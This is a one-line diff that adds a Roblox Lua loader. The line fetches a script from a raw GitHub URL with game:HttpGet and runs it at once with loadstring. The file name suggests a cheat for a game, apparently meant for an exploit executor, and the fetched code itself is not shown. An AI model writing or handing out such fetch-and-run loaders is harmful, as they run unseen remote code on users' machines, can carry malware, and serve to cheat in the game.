@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/new-mythic-hypershot-spam3-1gxil2zrg0ow78.lua"))()
